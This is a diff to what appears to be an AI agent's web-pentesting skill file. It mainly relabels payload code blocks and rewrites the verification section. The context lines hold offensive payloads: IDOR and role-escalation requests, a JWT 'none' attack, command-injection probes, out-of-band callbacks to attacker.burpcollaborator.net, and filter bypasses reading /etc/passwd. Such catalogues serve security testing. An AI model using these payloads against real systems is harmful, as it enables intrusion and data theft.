@@ -257,7 +257,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ## IDOR / AUTH BYPASS PAYLOADS
 
 ### Horizontal Privilege Escalation
-```bash
+```text
 # Change numeric ID
 GET /api/user/123/profile → GET /api/user/124/profile
 
@@ -275,7 +275,7 @@ GET /api/orders → GET /api/orders?user_id=456
 ```
 
 ### Vertical Privilege Escalation
-```bash
+```text
 # Parameter pollution
 POST /api/user/update
 {"role": "admin"}
@@ -295,7 +295,7 @@ POST /api/user/update
 ## AUTHENTICATION BYPASS PAYLOADS
 
 ### JWT Attacks
-```bash
+```text
 # None algorithm
 # Decode JWT, change alg to "none", remove signature
 import base64, json
@@ -360,7 +360,7 @@ curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/login 
 ## COMMAND INJECTION PAYLOADS
 
 ### Basic Detection
-```bash
+```text
 ; id
 | id
 ` id `
@@ -374,7 +374,7 @@ $(sleep 5)
 ```
 
 ### Blind OOB (out-of-band confirmation)
-```bash
+```text
 ; curl https://attacker.burpcollaborator.net
 ; nslookup attacker.burpcollaborator.net
 $(nslookup attacker.burpcollaborator.net)
@@ -383,7 +383,7 @@ $(nslookup attacker.burpcollaborator.net)
 ```
 
 ### Bypass Techniques
-```bash
+```text
 # Bypass space filter
 ;{cat,/etc/passwd}
 ;cat${IFS}/etc/passwd
@@ -873,20 +873,6 @@ sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
 
 ---
 
-## Verification
-
-1. **Payload catalog** — confirm payload breadth:
-   ```bash
-   grep -c "XSS\|SQLi\|SSRF\|XXE\|SSTI\|LFI" SKILL.md && echo "PASS: multiple vuln classes covered" || echo "FAIL"
-   ```
-2. **WAF bypass** — confirm bypass payloads exist:
-   ```bash
-   grep -q "bypass\|filter\|WAF\|encoding" SKILL.md && echo "PASS: bypass payloads present" || echo "FAIL"
-   ```
-All tests verify security arsenal readiness.
-
----
-
 ## Pitfalls
 - **Using payloads without understanding** — `<script>alert(1)</script>` is the most-blocked payload. Understand why bypasses work before using them.
 - **Assuming all payloads work on all targets** — XSS payloads for React differ from Angular, PHP, or classic HTML. Match payload to technology.
@@ -894,6 +880,12 @@ All tests verify security arsenal readiness.
 - **Stale payload lists** — WAF rules update. A bypass that worked last month may be patched. Test payloads against the current target.
 - **Payloads without context markers** — always use unique markers (8+ random chars) to confirm the payload was reflected, not just coincidence.
 
+---
+
+## Verification
+- The payloads actually used against each target and their results are recorded; the catalogue alone is not evidence.
+- A WAF-bypass claim requires the bypassed request to reach origin behavior, not only a different status code.
+- Raw requests and responses are stored beneath `${OUTPUT_DIR:-./output}`.
 
 ---
 
